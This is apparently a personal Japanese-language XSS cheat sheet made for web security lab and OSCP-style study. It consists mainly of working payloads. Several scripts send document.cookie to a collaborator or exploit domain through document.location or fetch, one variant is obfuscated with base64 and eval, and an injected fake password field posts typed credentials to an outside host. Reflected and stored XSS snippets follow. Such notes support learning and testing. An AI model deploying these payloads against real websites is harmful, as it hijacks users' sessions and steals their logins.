
- [XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

##### Cookie窃取用スクリプト基本形

```
alert(1)
```
	↓
```
document.location='https://COLLABORATOR_DOMAIN?c='+document.cookie;
```
	or
```
fetch('https://COLLABORATOR_DOMAIN?c='+document.cookie)
```
	or
```
eval(atob("base64エンコードした上記2つのペイロード"))
```
[Web攻撃の難読化](../../../OSCP/Cheatsheet/AV%20Evasion(範囲外)/Web攻撃の難読化.md#base64%20encoding)
[🔍 Recon](../../cheatsheet/🔍%20Recon.md#⭐️URLエンコードについて)

---
### 基本形

オンライン上の簡潔なcheatsheetと日本人のcheatsheet見つつ...

###### HTMLへのXSS : Tag is not allowed || Event is not allowed

- [4. XSS contexts](4.%20XSS%20contexts.md#HTMLタグ内でのXSS)のHTMLタグ内のXSSメソドロジーかも

###### インプットがHTMLエンコードされる

[4. XSS contexts](4.%20XSS%20contexts.md#引用符がエスケープされるケース)

###### JavaScript内部へのXSS

- [4. XSS contexts](4.%20XSS%20contexts.md#JavaScriptへのXSS)

###### Stay-logged-in Cookieを取得

1. Comment機能の特定パラメタに以下のスクリプトを注入
```js
<script>
	document.location='https://EXPLOIT_DOMAIN/c='+document.cookie
</script>
```

2. エクスプロイトサーバのAccess logを確認し、Cookieを入手する
3. [⚡️Authentication](../../Server-side/Authentication/⚡️Authentication.md#Stay-logged-inから入る場合)へ

---
### OAST

###### username & passwordを取得

1. Comment機能の特定パラメタに以下のスクリプトを注入
```http
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://COLLABORATOR_DOMAIN',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```
2. Request to collaboratorを確認

##### Cookieを取得する

###### Comment機能の場合

1. Comment機能の特定パラメタに以下のスクリプトを注入
```http
<script>
fetch('https://COLLABORATOR_DOMAIN', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>
```
2. Request to collaboratorを確認

###### Cookieがusername:tokenの場合

1. `username`の箇所にスクリプトを注入
```
'"><svg/onload=fetch(`//YOUR-COLLABORATOR-PAYLOAD/${encodeURIComponent(document.cookie)}`)>:YOUR-SESSION-ID
```
- `encodeURIComponent()`: URLの一部としてcookieを送るときに使用
2. Request to collaboratorを確認

---
## Misc

###### Reflected XSS基本payload

1. no user interaction in HTML
```html
<iframe src="https://TARGET_NET?[vuln_param]=[payload]">
```
![[Pasted image 20240218101126.png | 50]]↓

2. need user interaction(iframeは禁止されているからこれでうまくいくことが多い)
```html
<script>
location = 'https://TARGET_NET?[vuln_param]=[payload]'
</script>
```

###### Stored XSS基本payload
```js
<script>alert(1)</script>
```

```html
<img src=1 onerror=alert(1)>
```
